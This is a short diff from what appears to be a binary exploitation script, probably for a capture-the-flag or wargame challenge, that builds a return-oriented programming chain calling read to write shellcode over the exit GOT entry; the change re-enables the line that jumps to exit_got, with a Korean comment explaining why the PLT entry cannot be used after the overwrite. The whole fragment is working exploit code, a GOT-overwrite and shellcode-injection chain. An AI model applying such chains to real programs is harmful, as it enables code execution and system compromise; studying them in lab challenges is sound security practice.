@@ -46,7 +46,8 @@ payload += p64(pop_rsi_pop_r15) + p64(exit_got) + p64(0)
 payload += p64(pop_rdx) + p64(len(shellcode))
 payload += p64(read_plt)
 
-# payload += p64(exit_got)
+payload += p64(exit_got)
+# payload += p64(exit_plt) # GOT Overwrite에서 쉘코드의 주소가 아닌 instruction 자체를 저장했기 때문에 plt로는 접근 불가
 
 # main의 read
 sleep(0.5)
